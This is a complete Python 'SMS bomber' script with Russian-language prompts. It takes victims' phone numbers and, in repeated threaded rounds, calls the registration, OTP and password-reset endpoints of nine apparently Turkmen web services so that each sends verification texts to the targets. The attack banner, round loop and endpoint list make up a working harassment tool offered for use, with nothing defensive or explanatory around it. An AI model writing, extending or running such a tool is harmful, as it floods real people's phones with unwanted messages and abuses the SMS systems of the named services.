# Для запуска на виртуальной машине
# !pip install requests
# !pip install colorama


from requests import post, get
from requests.exceptions import TooManyRedirects, ConnectionError
from colorama import Back, Fore, init as colinit
from time import sleep
from threading import Thread



class Sites:
	
	def belet(self, phone):
		try:
			r = post("https://api.belet.me/api/v1/auth/sign-in",
			json = {"phone":phone,"fingerprint":"110aec2bfcca53e0793f5973e5b86926"})
		except ConnectionError:
			print(f"Не удалось подключится к Belet :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Belet] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Belet] Ошибка: Код {r.status_code}")


	def gipertm(self, phone):
		try:
			r = post("https://gipertm.com/api/v1/profile/register",
			json = {"lang":"tk", "username":str(phone)})
		except ConnectionError:
			print(f"Не удалось подключится к GiperTM :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[GiperTm] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[GiperTm] Ошибка: Код {r.status_code}")


	def asman_express(self, phone):
		try:
			r = post("https://shop-adm.asmanexpress.com/api/customers/auth/otp?type=register",
			json = {"phone":str(phone)})
		except ConnectionError:
			print(f"Не удалось подключится к Asman Express :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Asman Express] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Asman Express] Ошибка: Код {r.status_code}")


	def nesipetsin(self, phone):
		try:
			r = post("https://nesipetsin.com:7070/nesipetsin/mobile/user/register",
			json = {"method":"phone","step":1,"phone":str(phone)[3:],"email":"null","code":"null","password":"null","confirmPassword":"null","errorMsg":"null"})
		except ConnectionError:
			print(f"Не удалось подключится к Nesip Etsin :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Nesip Etsin] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Nesip Etsin] Ошибка: Код {r.status_code}")


	def saraytm(self, phone):
		try:
			r = get("https://saray.tm/verify?phone=" + str(phone)[3:] + "&terms=accept")
		except ConnectionError:
			print(f"Не удалось подключится к SarayTM :(")
			return 0
		
		if r.status_code == 200:
			print(Fore.GREEN + "[SarayTm] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[SarayTm] Ошибка: Код {r.status_code}")


	def awtoyoly(self, phone):
		try:
			r = post("http://awtoyoly.com.tm/Client/AwtoCheckLogin",
			data = {"phone":str(phone)[3:]})
		except ConnectionError:
			print(f"Не удалось подключится к AwtoYoly :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Awtoyoly] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Awtoyoly] Ошибка: Код {r.status_code}")



	def ynamdar(self, phone):
		try:
			r = post("https://ynamdar.com/v3/forgot_password",
			data = {"registration-type": "phone", "phone": str(phone)[3:], "action": "send-confirmation-code"})
		except ConnectionError:
			print(f"Не удалось подключится к Ynamdar :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Ynamdar] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Ynamdar] Ошибка: Код {r.status_code}")


	def markayoly(self, phone):
		try:
			r = post("https://api.markayoly.com/api/start-signup",
			json = {"phone":str(phone)[3:]})
		except ConnectionError:
			print(f"Не удалось подключится к Markayoly :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Markayoly] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Markayoly] Ошибка: Код {r.status_code}")


	def aydym(self, phone):
		try:
			r = post("https://aydym.com/api/v1/profile/register",
			json = {"username": str(phone), "owner": "web-aa3b6254-3e4e-4d88-ad44-5853d68e2c9f"})
		except ConnectionError:
			print(f"Не удалось подключится к Aydym :(")
			return 0

		if r.status_code == 200:
			print(Fore.GREEN + "[Aydym] Сообщение отправлено.")
		else:
			print(Fore.RED + f"[Aydym] Ошибка: Код {r.status_code}")
			

class Spammer(Sites):

	def __init__(self, phones, tries):
		colinit(autoreset=True)

		try:
			self.phones = [int(i) for i in phones.split(",")]
		except ValueError:
			print(Fore.RED + "[Ошибка] неправильно введён номер!")
			exit()

		self.tries = tries
		# print(self.phones)


	def start(self, phone):
		try:
			self.belet(phone)
			self.gipertm(phone)
			self.asman_express(phone)
			self.nesipetsin(phone)
			self.saraytm(phone)
			self.awtoyoly(phone)
			self.ynamdar(phone)
			self.markayoly(phone)
			self.aydym(phone)
	 
		except TooManyRedirects:
			print("Слишком много запросов, беру отдых...")
			sleep(10)
			self.tries += 1
			pass
		except Exception as unknownError:
			print("Необработанная ошибка:", unknownError)
			
		print("Круг завершился")


	def attack(self):
		print("""
			  _   _             _
\t\t     /\  | | | |           | |
\t\t    /  \ | |_| |_ __ _  ___| | __
\t\t   / /\ \| __| __/ _` |/ __| |/ /
\t\t  / ____ \ |_| || (_| | (__|   <
\t\t /_/    \_\__|\__\__,_|\___|_|\_\
\n\n
""")

		for _ in range(self.tries):
			for phone in self.phones:
				thread = Thread(target=self.start, args=(phone, ))
				thread.start()
				print(f"{_+1}.Круг пошёл...")

				if _ < self.tries - 1:
					sleep(10)



if __name__ == "__main__":
	print("""
\t\t  ___                 _ _ _____ __  __
\t\t / __|_ __  __ _ _ __| | |_   _|  \/  |
\t\t \__ \ '_ \/ _` | '  \_  _|| | | |\/| |
\t\t |___/ .__/\__,_|_|_|_||_| |_| |_|  |_|
\t\t     |_|
""")

	phone = input(Back.RED + "Введите номера через запятую: ")
	print(Back.RESET, end="")
	tries = int(input(Back.GREEN + "Введите кол-во кругов: "))
	print(Back.RESET)

	Spammer = Spammer(phone, tries)
	Spammer.attack()
	input("Нажмите чтобы выйти ")